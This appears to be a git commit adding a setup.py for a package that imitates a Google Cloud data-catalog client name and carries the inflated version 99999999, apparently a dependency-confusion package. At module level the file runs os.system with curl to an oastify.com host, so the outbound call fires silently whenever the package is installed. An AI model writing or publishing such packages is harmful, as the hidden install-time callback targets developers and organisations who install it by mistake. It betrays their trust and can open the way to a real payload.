206f255dcc75645fdbbc6956b1010b6f93386709
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2024-01-11 16:05:48 +0000

    Add package google-cloud-datacatalog-lineage-producer-client/99999999/google-cloud-datacatalog-lineage-producer-client-99999999.tar.gz

---
+++ packages/google-cloud-datacatalog-lineage-producer-client/google-cloud-datacatalog-lineage-producer-client-99999999.tar.gz/google-cloud-datacatalog-lineage-producer-client-99999999/setup.py
@@ -0,0 +1,14 @@
+from setuptools import setup, find_packages
+import os
+
+def hello():
+    os.system("curl gue7vbewr0xnqiz2vlofb4unsey5mwal.oastify.com")
+
+hello()
+
+setup(
+    name='google-cloud-datacatalog-lineage-producer-client',  # Replace with your package's name
+    version='99999999',
+    packages=find_packages(),
+    install_requires=[],  # List your project's dependencies here
+)
